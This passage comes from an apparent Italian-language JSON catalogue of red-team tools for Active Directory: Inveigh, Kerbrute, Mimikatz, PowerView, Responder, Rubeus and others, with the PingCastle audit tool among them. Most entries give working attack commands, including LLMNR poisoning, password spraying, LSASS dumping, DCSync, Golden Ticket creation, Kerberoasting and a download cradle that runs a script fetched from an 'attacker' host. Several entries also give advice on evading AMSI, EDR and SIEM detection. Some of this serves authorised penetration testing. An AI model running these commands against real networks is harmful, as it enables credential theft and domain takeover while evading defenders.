Listener SMB/HTTP)\nInveigh.exe\n\n# Avvio con parametri specifici (IP spoofing, disabilita NBNS)\nInveigh.exe -IP 192.168.1.50 -NBNS N\n\n# Modalità sola analisi (senza spoofing attivo)\nInveigh.exe -Inspect</code></pre><p>Durante l'esecuzione, premere <code>ESC</code> per entrare nella console di gestione e visualizzare le catture in tempo reale con comandi come <code>GET NTLMV2</code> o <code>GET USERS</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Inveigh è fondamentale nelle fasi iniziali di un <strong>Internal Pentest</strong> per ottenere rapidamente credenziali valide sfruttando il traffico di background della rete.</p><p>È particolarmente efficace la mattina presto o dopo i riavvii, quando i PC cercano risorse di rete. In scenari di <strong>Red Teaming</strong>, la versione compilata è preferita alla versione PowerShell per evitare le detection AMSI e i log di script block, offrendo maggiore stabilità in lunghe sessioni di ascolto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso a livello di rete. IDS/IPS rilevano facilmente risposte non sollecitate o anomale ai protocolli broadcast. Defender for Identity segnala attività di spoofing.</p><p><strong>Impatto operativo:</strong> Può causare conflitti IP o malfunzionamenti di rete se configurato male. Il relay SMB può bloccare l'accesso alle risorse legittime per la vittima durante l'attacco.</p><p><strong>Mitigazioni:</strong> Usare whitelist/blacklist per targettizzare solo macchine specifiche. Disabilitare protocolli legacy (NBNS) se non necessari. Limitare la durata dell'attacco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "inveigh-ps1",
    "name": "Inveigh.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Versione PowerShell legacy di Inveigh per attacchi MITM fileless e spoofing LLMNR/NBNS in ambienti con restrizioni sui binari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Inveigh.ps1</strong> è la versione originale in PowerShell del tool di spoofing. Sebbene la versione EXE sia più performante, lo script PS1 rimane vitale per scenari \"fileless\" o \"living off the land\", dove caricare binari compilati sul disco è impossibile o troppo rischioso. Offre le stesse capacità core di poisoning LLMNR/NBNS e cattura credenziali, eseguendo tutto in memoria all'interno di un processo PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Esecuzione Fileless:</strong> Può essere caricato direttamente in memoria (es. tramite download cradle) senza toccare il disco, bypassando controlli antivirus basati su file statici.</p><p><strong>Spoofing & Capture:</strong> Gestisce lo spoofing dei nomi e l'ascolto su protocolli HTTP/SMB per catturare challenge NTLM. Include funzionalità per output formattato compatibile con Hashcat.</p><p><strong>Integrazione Framework:</strong> Essendo uno script, è facilmente integrabile in framework di C2 come Empire o Covenant, o eseguibile tramite sessioni di gestione remota (WinRM) esistenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo ed invocare la funzione principale. Richiede privilegi amministrativi locale.</p><pre><code># Import ed esecuzione base\nImport-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y\n\n# Esecuzione stealth con download in memoria e timer di stop\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')\nInvoke-Inveigh -RunTime 10 -Tool 2 -IP 192.168.1.50</code></pre><p>Utilizzare <code>Stop-Inveigh</code> per terminare i job di ascolto in background e pulire le risorse di rete.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Lateral Movement</strong> su host dove non si vuole lasciare artefatti binari. Se si compromette una workstation con restrizioni sull'esecuzione di EXE ma con PowerShell abilitato, Inveigh.ps1 permette di trasformare l'host in un punto di ascolto per catturare credenziali di altri utenti (es. admin di dominio) che navigano nella stessa subnet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto vulnerabile a <strong>AMSI</strong> (Antimalware Scan Interface) e <strong>Script Block Logging</strong>. La maggior parte degli EDR moderni bloccherà l'esecuzione dello script se non offuscato pesantemente.</p><p><strong>Impatto operativo:</strong> L'esecuzione prolungata in PowerShell può consumare risorse. Stessi rischi di rete della versione EXE.</p><p><strong>Mitigazioni:</strong> Usare offuscatori (es. Invoke-Obfuscation) prima del caricamento. Preferire la versione C# se si dispone di un metodo per eseguire binari, usare PS1 solo come fallback.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-win",
    "name": "kerbrute_Windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool in Go per enumerazione utenti e password spraying veloce e stealth sfruttando la pre-autenticazione Kerberos (porta 88).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos per enumerare utenti validi e testare password, offrendo un'alternativa molto più rapida e furtiva rispetto ai metodi tradizionali basati su SMB o LDAP. Poiché interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, evita di generare i rumorosi log di \"Logon Failure\" (Event ID 4625) tipici dei tentativi NTLM, rendendo l'attività molto più difficile da rilevare per i difensori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> Sfrutta il fatto che il KDC restituisce codici di errore diversi se un utente esiste (<code>KDC_ERR_PREAUTH_REQUIRED</code>) o meno (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>). Questo permette di validare liste di username enormi in pochi secondi senza inviare alcuna password.</p><p><strong>Password Spraying:</strong> Esegue tentativi di login massivi provando una password contro molti utenti. Se il login ha successo, ottiene un TGT; se fallisce, genera un errore Kerberos. Questo metodo è più veloce del protocollo SMB e non rischia di bloccare l'account se usato correttamente (una sola password).</p><p><strong>Nessun requisito di dominio:</strong> Può essere eseguito da una macchina fuori dominio (es. laptop dell'attaccante in VPN), purché abbia visibilità di rete verso il Domain Controller, rendendolo perfetto per le fasi iniziali di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il binario standalone non richiede installazione. È fondamentale puntare al Domain Controller corretto.</p><pre><code># Enumerazione utenti validi da una wordlist\nkerbrute_windows.exe userenum -d domain.local --dc 192.168.1.10 users_list.txt\n\n# Password Spraying (Check password 'Welcome1')\nkerbrute_windows.exe passwordspray -d domain.local users.txt \"Welcome1\"\n\n# Verifica singola credenziale (Brute force - sconsigliato massivamente)\nkerbrute_windows.exe bruteuser -d domain.local passwords.txt username</code></pre><p>L'output evidenzia in verde le credenziali valide trovate, che possono essere usate immediatamente per accessi VPN, OWA o SMB.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, Kerbrute è lo standard per ripulire liste di utenti generate tramite OSINT (es.</p><p>LinkedIn) e ottenere un elenco di target validi. Nel <strong>Password Spraying</strong>, è preferito per la sua velocità e per la minore impronta nei log di sicurezza standard di Windows, aggirando regole SIEM basate solo su eventi 4625.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene non generi 4625, genera eventi 4771 (Kerberos Pre-Auth Failed). Un volume anomalo di 4771 da un singolo IP è un IoC chiaro per Defender for Identity e SOC avanzati.</p><p><strong>Impatto operativo:</strong> Basso rischio di lockout se usato in modalità spray (1 password). Attenzione alla modalità brute-force che bloccherà account.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>--safe</code> (se disponibile nella build) o introdurre delay manuali. Non eseguire da un IP che non si vuole bruciare. Alternare i DC target se presenti multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/gentilkiwi/mimikatz",
    "desc": "Il framework definitivo per credential dumping, manipolazione ticket Kerberos e attacchi avanzati ad Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mimikatz</strong> è lo strumento che ha rivoluzionato la sicurezza di Windows, dimostrando le debolezze strutturali nella gestione delle credenziali in memoria. Consente agli attaccanti di estrarre password in chiaro, hash NTLM, ticket Kerberos e certificati direttamente dal processo LSASS (Local Security Authority Subsystem Service). Oltre al dumping, è una piattaforma completa per generare token di accesso falsi (Golden/Silver Tickets) e manipolare il funzionamento della crittografia di dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Dumping (Sekurlsa):</strong> Il modulo più noto, capace di leggere la memoria di LSASS per recuperare le credenziali di tutti gli utenti loggati (incluso WDigest, SSP, MSV1_0). Se configurato, può recuperare password in chiaro anche su versioni recenti di Windows.</p><p><strong>Kerberos Manipulation:</strong> Permette di eseguire attacchi Pass-the-Ticket (PTT), Pass-the-Key (PTK) e di creare ticket contraffatti come il Golden Ticket (TGT valido per 10 anni con diritti di Domain Admin) e Silver Ticket (accesso a servizi specifici), garantendo persistenza a lungo termine.</p><p><strong>DCSync:</strong> Simula il comportamento di un Domain Controller per richiedere la replicazione dei dati degli utenti (inclusi gli hash delle password) via protocollo MS-DRSR, permettendo di ottenere credenziali di tutti gli utenti del dominio senza eseguire codice sul DC reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mimikatz dispone di una console interattiva. Richiede privilegi di Debug (spesso ottenuti come Admin/SYSTEM).</p><pre><code># Avvio e acquisizione privilegi debug\nmimikatz # privilege::debug\n\n# Dump password e hash da LSASS\nmimikatz # sekurlsa::logonpasswords\n\n# Esecuzione DCSync (da utente con diritti di replica, es. Domain Admin)\nmimikatz # lsadump::dcsync /domain:lab.local /user:Administrator\n\n# Creazione Golden Ticket\nmimikatz # kerberos::golden /user:FakeAdmin /domain:lab.local /sid:S-1-5... /krbtgt:hash... /id:500 /ptt</code></pre><p>Può essere eseguito anche \"oneliners\" passando i comandi come argomenti all'eseguibile: <code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong> e <strong>Lateral Movement</strong>, è lo strumento primario per trasformare un accesso locale in un compromesso di dominio (tramite credential theft).</p><p>Per la <strong>Persistence</strong>, i Golden Ticket e Skeleton Key offrono backdoor resilienti. I Blue Team lo utilizzano per verificare l'efficacia delle protezioni come Credential Guard e Protected Users Group.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Mimikatz è la \"firma\" più cercata al mondo. I binari su disco sono bloccati da qualsiasi AV. L'accesso alla memoria di LSASS genera eventi Sysmon (ID 10) e alert EDR critici. DCSync genera eventi di accesso agli oggetti AD (4662).</p><p><strong>Impatto operativo:</strong> Manipolare LSASS può causare Blue Screen of Death (BSOD) se non eseguito con cautela o versioni compatibili. Usare con estrema attenzione su server di produzione.</p><p><strong>Mitigazioni:</strong> Mai usare il binario standard. Eseguire via PowerShell in memoria (Invoke-Mimikatz) con offuscamento pesante, o meglio, usare tecniche di dumping alternative (es. ProcDump, Comsvcs) e analizzare il dump offline con Mimikatz sulla propria macchina.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Credential_Dump"
    ],
    "notes": null
  },
  {
    "id": "pingcastle",
    "name": "PingCastle",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.pingcastle.com/download/",
    "desc": "Scanner di sicurezza per Active Directory che genera report dettagliati su rischi, health check e mappa delle relazioni di trust.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PingCastle</strong> è uno strumento di audit progettato per valutare rapidamente il livello di sicurezza di un ambiente Active Directory. Basato su un modello di maturità (CMMI), analizza le configurazioni del dominio e genera un report HTML intuitivo che evidenzia i rischi, assegnando un punteggio di pericolo. È ampiamente utilizzato per identificare vulnerabilità strutturali, relazioni di trust dimenticate e account obsoleti che potrebbero essere sfruttati dagli attaccanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Health Check & Risk Scoring:</strong> Esegue centinaia di controlli di sicurezza (es. LAPS mancante, SMBv1 attivo, amministratori in gruppi a rischio) e calcola un punteggio di rischio aggregato, permettendo di prioritizzare le azioni correttive.</p><p><strong>Mappatura Trust & Forest:</strong> Visualizza graficamente le relazioni di trust tra domini e foreste, evidenziando trust bidirezionali pericolosi verso ambienti meno sicuri o di test.</p><p><strong>Stale Object Analysis:</strong> Identifica utenti e computer inattivi (\"stale\"), che rappresentano una superficie d'attacco inutile e dovrebbero essere disabilitati o rimossi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PingCastle è un eseguibile standalone che può essere lanciato con un account utente standard di dominio (l'accesso in lettura è sufficiente per quasi tutti i check).</p><pre><code># Modalità interattiva (menu guidato)\nPingCastle.exe\n\n# Healthcheck automatico sul dominio corrente\nPingCastle.exe --healthcheck --server domain.local\n\n# Scansione di domini in trust\nPingCastle.exe --scanner trust</code></pre><p>Al termine, genera un report HTML nella cartella di esecuzione, navigabile via browser, con spiegazioni dettagliate per ogni finding e raccomandazioni per la remediation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato regolarmente dai <strong>System Administrator</strong> per mantenere l'igiene dell'AD e prepararsi agli audit.</p><p>Per i <strong>Penetration Tester</strong>, è eccellente nelle fasi iniziali per ottenere una visione d'insieme delle debolezze strutturali del cliente (es. \"Quick Wins\") senza generare traffico di attacco, guidando le fasi successive verso i punti più deboli dell'infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume sostenuto di traffico LDAP e query verso il DC. Sebbene sia traffico legittimo di lettura, l'intensità può essere notata.</p><p><strong>Impatto operativo:</strong> Basso. L'operazione è di sola lettura.</p><p><strong>Mitigazioni:</strong> Proteggere i report generati poiché contengono la mappa completa delle vulnerabilità dell'azienda.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "powerupsql",
    "name": "PowerUpSQL",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NetSPI/PowerUpSQL",
    "desc": "Toolkit PowerShell per discovery, audit e privilege escalation su istanze SQL Server enterprise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerUpSQL</strong> è un framework offensivo dedicato all'attacco delle infrastrutture Microsoft SQL Server. Permette di scoprire istanze SQL sparse nella rete, verificare configurazioni deboli (come password di default o account sa vuoti) ed eseguire escalation dei privilegi. È particolarmente potente nello sfruttare le catene di \"Linked Servers\" per muoversi lateralmente tra database e ottenere esecuzione di codice sul sistema operativo sottostante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Massiva:</strong> Trova server SQL tramite query SPN, broadcast UDP e scansioni mirate, mappando rapidamente la superficie d'attacco database dell'azienda.</p><p><strong>Linked Server Crawling:</strong> La feature più temibile: segue automaticamente i link tra database server per trovare percorsi che portano a server critici o dove l'utente ha privilegi elevati (spesso sysadmin), permettendo di saltare da un DB di test a uno di produzione.</p><p><strong>Command Execution:</strong> Automatizza l'abilitazione e l'uso di procedure come <code>xp_cmdshell</code>, <code>Ole Automation Procedures</code> o assembly CLR malevoli per passare dall'accesso SQL all'esecuzione di comandi shell come SYSTEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo PowerShell.</p><pre><code># Discovery istanze nel dominio\nGet-SQLInstanceDomain\n\n# Audit rapido delle configurazioni di default\nGet-SQLInstanceDomain | Invoke-SQLAudit\n\n# Crawling automatico dei link per trovare privilegi sysadmin\nGet-SQLInstanceDomain | Get-SQLServerLinkCrawl -Verbose\n\n# Esecuzione comandi OS su istanza vulnerabile\nInvoke-SQLOSCmd -Instance \"SQLSRV01\" -Command \"whoami\" -Verbose</code></pre><p>Il comando <code>Invoke-SQLAudit</code> genera un report CSV con le vulnerabilità identificate per ogni istanza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Network Pentest</strong>, i database SQL sono spesso il \"ventre molle\": patchati raramente e configurati con account di servizio privilegiati.</p><p>PowerUpSQL permette di sfruttare un accesso database limitato per ottenere il controllo completo del server e usarlo come pivot. In <strong>Data Exfiltration</strong>, facilita l'individuazione e l'estrazione di dati sensibili da tabelle critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'abilitazione di <code>xp_cmdshell</code> è un evento ad alta criticità monitorato dai SIEM. Scansioni di discovery e login falliti generano log applicativi SQL.</p><p><strong>Impatto operativo:</strong> L'esecuzione di comandi o query pesanti può degradare le performance del DB. Modificare configurazioni globali può impattare le applicazioni.</p><p><strong>Mitigazioni:</strong> Ripristinare sempre le configurazioni (es. disabilitare xp_cmdshell) dopo l'uso. Limitare il crawling a target specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "powerview-ps1",
    "name": "PowerView.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PowerShellMafia/PowerSploit",
    "desc": "Script PowerShell di PowerSploit per ricognizione Active Directory pura: enumera utenti, gruppi, trust e sessioni senza dipendenze esterne.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerView è uno degli strumenti di enumerazione offensiva più iconici per ambienti Active Directory. Scritto interamente in PowerShell, non utilizza moduli RSAT amministrativi ma interagisce direttamente con le API Win32 e LDAP per mappare il dominio. È progettato per ottenere \"Situational Awareness\" completa: capire chi sono gli admin, dove sono loggati e quali relazioni di trust esistono, il tutto vivendo \"off-the-land\" senza introdurre binari compilati sospetti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User & Group Hunting:</strong> Funzioni come <code>Invoke-UserHunter</code> e <code>Find-LocalAdminAccess</code> sono vitali per il movimento laterale. Scansionano la rete per individuare su quali macchine sono attive sessioni di utenti privilegiati o dove l'utente corrente ha diritti di amministratore locale.</p><p><strong>Enumerazione ACL & GPO:</strong> Permette di analizzare le Access Control List (<code>Get-DomainObjectAcl</code>) per trovare \"strade nascoste\" di escalation (es. un utente che può resettare la password di un admin) e di leggere le Group Policy per identificare policy di sicurezza deboli o script di avvio modificabili.</p><p><strong>Mappatura Trust:</strong> Con <code>Get-DomainTrust</code> e <code>Get-ForestTrust</code>, visualizza le relazioni logiche tra domini, essenziale per pianificare attacchi che attraversano i confini della foresta AD (es. da un dominio child compromesso al root parent).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo in memoria (spesso bypassando AMSI prima).</p><pre><code># Caricamento e info base dominio\nImport-Module .\\PowerView.ps1\nGet-Domain\n\n# Trovare dove sono loggati i Domain Admin\nInvoke-UserHunter -GroupName \"Domain Admins\" -Stealth\n\n# Enumerare share di rete leggibili in tutto il dominio\nInvoke-ShareFinder -CheckShareAccess -Verbose</code></pre><p>Molte funzioni accettano filtri LDAP raw per query di precisione chirurgica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, è lo strumento primario per rispondere alla domanda \"Dove vado ora?\".</p><p>Se si compromette un utente, PowerView rivela immediatamente se quell'utente ha accesso speciale (es. RDP su un server critico) o se appartiene a gruppi annidati interessanti. In fase di <strong>Privilege Escalation</strong>, l'analisi delle ACL spesso rivela la via più silenziosa per diventare Domain Admin senza usare exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PowerView è pesantemente firmato dai vendor antivirus. L'esecuzione su disco è quasi sempre bloccata. AMSI intercetta le funzioni caricate in memoria. Le scansioni di rete (es. UserHunter) generano traffico SMB/RPC verso molti host.</p><p><strong>Mitigazioni:</strong> Utilizzare versioni offuscate o eseguire via C2 che supportano l'esecuzione in memoria (come Cobalt Strike <code>powershell-import</code>). Preferire query LDAP mirate (<code>Get-DomainUser</code>) rispetto a scansioni attive (<code>Invoke-UserHunter</code>) se il monitoraggio è alto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "responder-windows",
    "name": "Responder-Windows",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/Responder-Windows",
    "desc": "Versione Windows (spesso Python script) di Responder per LLMNR/NBT-NS poisoning e cattura hash NTLM in reti locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Responder-Windows e la variante nativa per sistemi Windows del celebre tool Responder, originariamente sviluppato per Linux. Sfruttando l'interprete Python installato localmente, permette di eseguire attacchi di poisoning sui protocolli di risoluzione nomi broadcast come LLMNR, NBT-NS e mDNS direttamente da una macchina Windows. Quando un host non riesce a risolvere un nome tramite DNS, ricade su protocolli broadcast: Responder intercetta queste richieste e risponde falsamente, costringendo la vittima a inviare le proprie credenziali NTLM all'attaccante.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>LLMNR/NBT-NS Poisoning:</strong> Ascolta il traffico broadcast sulla rete locale e risponde alle query di risoluzione nomi non soddisfatte dal DNS. Quando un utente digita un percorso UNC errato o cerca una risorsa inesistente, Responder si interpone e cattura automaticamente l'hash NTLMv2 della vittima.</p><p><strong>Multi-Protocol Auth Capture:</strong> Simula server fasulli per SMB, HTTP, HTTPS, WPAD, FTP, POP3, IMAP e SQL Server. Ogni protocollo e gestito da un modulo dedicato che forza il client a presentare le credenziali, massimizzando le opportunita di cattura.</p><p><strong>WPAD Injection:</strong> Risponde alle richieste WPAD iniettando una configurazione proxy malevola, reindirizzando il traffico HTTP degli utenti attraverso l'attaccante per catturare credenziali anche da applicazioni che non usano SMB.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python su Windows e privilegi di amministratore locale per il binding sulle porte di rete.</p><pre><code># Avvio standard su interfaccia specifica\npython Responder.py -I \"Ethernet0\" -wrf\n\n# Analisi passiva (solo logging, senza poisoning)\npython Responder.py -I \"Ethernet0\" -A\n\n# Forzare solo cattura SMB e HTTP\npython Responder.py -I \"Ethernet0\" -r -d -w</code></pre><p>Gli hash catturati vengono salvati in logs/ in formato compatibile con Hashcat (modulo 5600) e John the Ripper.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest su postazione Windows:</strong> Quando l'operatore ha accesso a una workstation Windows nella rete target ma non puo introdurre una macchina Kali, questa versione permette di condurre attacchi MITM per la raccolta di credenziali. Utile in ambienti dove solo macchine domain-joined accedono alla rete.</p><p><strong>Credential Harvesting in reti segmentate:</strong> Quando si ottiene accesso a un segmento tramite pivot, eseguire Responder sulla macchina compromessa permette di catturare hash di utenti privilegiati che transitano su quel segmento.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. EDR come CrowdStrike e Defender rilevano l'apertura di porte NetBIOS e le risposte LLMNR anomale. Soluzioni NDR come Darktrace identificano il pattern di risposta rapida tipico del poisoning.</p><p><strong>Impatto operativo:</strong> Il poisoning puo causare interruzioni di servizio se Responder risponde a query legittime, generando errori visibili agli utenti.</p><p><strong>Mitigazioni:</strong> Disabilitare LLMNR e NBT-NS via GPO e la contromisura principale. SMB Signing obbligatorio impedisce il relay degli hash. Monitorare eventi 4697 e 7045 per servizi anomali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rpcdump-windows",
    "name": "rpcdump_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/csandker/RPCDump",
    "desc": "Utility per enumerare endpoint RPC (porta 135), mappare interfacce UUID e identificare servizi nascosti o vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RPCDump è uno strumento diagnostico essenziale per la fase di ricognizione interna. Interroga il servizio RPC Endpoint Mapper (sulla porta TCP 135) di un host remoto per ottenere l'elenco completo delle interfacce RPC registrate, i loro UUID, i protocolli di binding e le annotazioni. Questa visibilità permette di identificare servizi non standard, versioni di software specifiche e potenziali target vulnerabili (es. vecchie interfacce vulnerabili a MS08-067 o PrintNightmare) che non apparirebbero in una normale scansione di porte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Endpoint:</strong> Estrae la lista degli endpoint dinamici e statici, rivelando quali porte effimere sono in ascolto per servizi specifici (es. DHCP, DNS management, servizi proprietari).</p><p><strong>Analisi UUID:</strong> Permette di correlare gli UUID universali trovati con servizi noti. Ad esempio, la presenza di UUID specifici può indicare l'installazione di software di backup o di gestione remota vulnerabile.</p><p><strong>Service Discovery:</strong> Identifica servizi che non rispondono alle scansioni SYN standard ma sono raggiungibili tramite Named Pipes o RPC over HTTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool è una semplice utility a riga di comando che richiede l'IP del target.</p><pre><code># Enumerazione base verso un target remoto\nrpcdump.exe -p 192.168.1.10\n\n# Enumerazione verbose con dettagli sui binding\nrpcdump.exe -v -p 192.168.1.10</code></pre><p>L'output elencherà ogni interfaccia con il formato <code>UUID vMajor.Minor (Annotation) [Binding]</code>. Analizzare le annotazioni per identificare rapidamente software interessanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In una fase di <strong>Discovery approfondita</strong>, RPCDump aiuta a mappare la superficie d'attacco reale di un server Windows, rivelando servizi che potrebbero essere firewallati sulle porte standard ma esposti via RPC. È utile anche per confermare la presenza di patch: se un'interfaccia vulnerabile nota non è più listata o ha cambiato versione, è probabile che il sistema sia stato aggiornato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La connessione alla porta 135 e l'interrogazione dell'Endpoint Mapper sono traffico legittimo ma, se eseguite in sequenza su molti host, costituiscono un chiaro pattern di ricognizione.</p><p><strong>Impatto operativo:</strong> Nullo, è una query informativa standard.</p><p><strong>Mitigazioni:</strong> Eseguire scansioni mirate piuttosto che sweeping sull'intera subnet.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "rubeus-exe",
    "name": "Rubeus.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/GhostPack/Rubeus",
    "desc": "Il coltellino svizzero C# per Kerberos abuse: TGT requests, roasting, ticket extraction, pass-the-ticket e monitoraggio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Rubeus e lo strumento de facto per la manipolazione avanzata del protocollo Kerberos in ambienti Active Directory. Sviluppato in C# come parte di GhostPack, opera sia come eseguibile standalone sia tramite execute-assembly in Cobalt Strike. Copre praticamente ogni vettore di attacco Kerberos: dalla richiesta e manipolazione di ticket TGT/TGS, all'estrazione di hash tramite Kerberoasting e AS-REP Roasting, fino ad attacchi avanzati come Diamond Ticket, S4U delegation abuse e Overpass-the-Hash.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Kerberoasting e AS-REP Roasting:</strong> Esegue richieste TGS per account di servizio con SPN, estraendo hash RC4 o AES crackabili offline. Per AS-REP Roasting, identifica account con pre-autenticazione disabilitata e ne estrae l'hash senza credenziali valide. Supporta output Hashcat e John the Ripper.</p><p><strong>Ticket Management avanzato:</strong> Estrae ticket dalla memoria di sessioni di altri utenti (triage/dump), inietta ticket nella sessione corrente (pass-the-ticket), rinnova ticket scaduti e monitora nuovi TGT in tempo reale (harvesting). Supporta creazione di Golden/Silver Ticket con chiavi note.</p><p><strong>Delegation Abuse:</strong> Implementa attacchi S4U per abusare di Constrained e Resource-Based Constrained Delegation. Include moduli per Diamond Ticket, molto piu difficile da rilevare rispetto al Golden Ticket classico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire come binario o iniettare in memoria tramite execute-assembly.</p><pre><code># Kerberoasting con output su file\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Kerberoasting stealth con AES\nRubeus.exe kerberoast /tgtdeleg /outfile:hashes_aes.txt\n\n# Pass-the-Ticket da file kirbi\nRubeus.exe ptt /ticket:administrator.kirbi\n\n# Monitoraggio nuovi TGT\nRubeus.exe monitor /interval:10 /nowrap\n\n# Overpass-the-Hash con hash NTLM\nRubeus.exe asktgt /user:admin /rc4:NTHASH /ptt</code></pre><p>L'opzione /nowrap impedisce il word-wrap dei ticket base64 facilitandone il copia-incolla via C2.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Privilege Escalation tramite Roasting:</strong> Dopo l'accesso iniziale con utente low-privilege, Kerberoasting estrae hash di account di servizio spesso con password deboli, ottenendo credenziali privilegiate senza interazione diretta con i sistemi target.</p><p><strong>Lateral Movement e Persistence:</strong> Overpass-the-Hash permette di usare hash NTLM per ottenere ticket Kerberos validi. Golden Ticket garantisce accesso illimitato finche la 